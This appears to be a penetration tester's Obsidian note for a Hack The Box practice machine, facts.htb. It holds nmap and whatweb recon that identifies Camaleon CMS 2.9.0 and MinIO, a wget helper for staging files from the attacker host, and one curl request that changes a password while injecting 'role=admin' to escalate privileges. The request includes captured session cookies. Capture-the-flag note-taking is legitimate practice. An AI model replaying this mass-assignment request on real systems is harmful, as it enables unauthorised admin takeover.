IP::   10.129.28.180

| Machine | IP Address | Notes |
| ------- | ---------- | ----- |
|         |            |       |

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
KALI IP::  10.10.17.59
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `${KaliIP}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Discovered Web Domain::   facts.htb
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `http://${discoveredDomain}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
[[Editing Page]]

wget from local python server
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8000/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```
## Provided Credentials
---

```

```

```

```

curl 'http://facts.htb/admin/users/8/updated_ajax' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://facts.htb/admin/profile/edit' -H 'X-CSRF-Token: w_rwDXMO2_gU1A66ENJ3g4rYrshp__wSUwR9_eHHLG7E6wlCLVLwCgV4tShb-FV5_SIdYW2Nb4l5ZiLs9uyCiA' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://facts.htb' -H 'Connection: keep-alive' -H 'Cookie: _factsapp_session=gArRi%2Bb1fOCYF6M%2FEh%2BWyHKOUj46ojfChMkn1wrjJc9uS8A92cBRFgZpY8WIrhW3mN6FNTkpuXM%2BrHPKDhEid92awh45rVjneoKp6Bkv9hYcASjs3As7gQovGrpn8X7UOtXbPLICjRKPTfi%2FYHLIX7xp08%2BnXEANpCU2O2L1z1pW7QSzbKXk0fpSeNYWuORuPT11Jg%2FPAyihmRYSzenrRxxiOD4%2FVDhVjqcGpHO8RrbGMWKz3MnfRabqlFaTf82Co0GdIssSCpptpUc%2BCaRubfvUm7ZVGF1E1S3M8s8XlybvZI7PASwRZCo7FdF%2BAJy1VeKCUHx7xB%2FYvNjzP7EJGCLw1tQmAHVd9WSyov%2B0AXEimsTtVVhU%2BLB%2Fb6nQzrIFRlvfZdoONLZ2eruPLJGmjAqFsSZp%2FYx%2FKmko4G%2F3NhgMoSW7i%2FyLNZBp2iw4dmAYo%2BUiiewSbhrywEg9oHh5UpKXIjswQGqdsICceotz5CFzKU%2FYdCEHjtwaO307dtcj%2BCOB38fc8Sm7zFQ6CQ%3D%3D--wQapmkQJuSx2aAAJ--l0iUFJaRZtgmNmJ6mzpvvg%3D%3D; auth_token=DgHPFTGAdz11YVsp8GTLeg&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A128.0%29+Gecko%2F20100101+Firefox%2F128.0&10.10.17.59' -H 'Priority: u=0' --data-raw '_method=patch&authenticity_token=w_rwDXMO2_gU1A66ENJ3g4rYrshp__wSUwR9_eHHLG7E6wlCLVLwCgV4tShb-FV5_SIdYW2Nb4l5ZiLs9uyCiA&password%5Bpassword%5D=TPG138735%40%23%26a&password%5Bpassword_confirmation%5D=TPG138735%40%23%26a&&password%5Brole%5D=admin'

---

CMS

http://facts.htb/ [200 OK] Cookies[_factsapp_session], Country[RESERVED][ZZ], Email[contact@facts.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.26.3 (Ubuntu)], HttpOnly[_factsapp_session], IP[10.129.28.161], Open-Graph-Protocol[website], Script, Title[facts], UncommonHeaders[x-content-type-options,x-permitted-cross-domain-policies,referrer-policy,plugin_front_cache,x-request-id], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[0], nginx[1.26.3]

 Camaleon CMS V2.9.0

## Open Ports
---
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)


80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/


54321/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (application/xml).
|_http-server-header: MinIO
| fingerprint-strings: 
|   FourOhFourRequest: 

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

---

## Discovered Subdomains
---


---

## Discovered Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```